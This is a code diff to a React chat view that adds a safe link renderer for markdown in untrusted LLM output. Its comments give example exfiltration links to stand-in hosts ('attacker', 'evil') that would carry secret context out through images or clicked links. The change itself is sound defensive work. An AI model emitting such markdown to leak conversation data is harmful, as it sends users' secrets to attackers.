@@ -306,6 +306,21 @@ export function GeneralChatArea({ logs, status, requiredAction, onOpenSettings, 
                                                                         // in the URL, e.g. ![](https://attacker/p?ctx=secret), and the browser sends
                                                                         // it). Show the alt text instead of rendering an <img> (deep-hunt).
                                                                         return <span className="text-zinc-400 dark:text-zinc-500 italic">[image omitted: {alt || 'untitled'}]</span>
+                                                                    },
+                                                                    a({ href, children }: any) {
+                                                                        // Q-273: chat is UNTRUSTED LLM output. A link like [click](https://evil/?leak=…)
+                                                                        // is a one-click exfiltration/phishing vector. Allow only http(s)/mailto (block
+                                                                        // javascript:/data:), open with no referrer, and SHOW the real destination so a
+                                                                        // misleading link text can't hide where it goes.
+                                                                        const url = typeof href === 'string' ? href : ''
+                                                                        const safe = /^(https?:|mailto:)/i.test(url)
+                                                                        if (!safe) return <span>{children}</span>
+                                                                        const textIsUrl = typeof children?.[0] === 'string' && children[0] === url
+                                                                        return (
+                                                                            <a href={url} target="_blank" rel="noopener noreferrer nofollow" title={url} className="text-purple-600 dark:text-purple-400 underline underline-offset-2">
+                                                                                {children}{!textIsUrl && <span className="text-zinc-400 dark:text-zinc-500 text-[11px] ml-1">({url})</span>}
+                                                                            </a>
+                                                                        )
                                                                     }
                                                                 }}
                                                             >
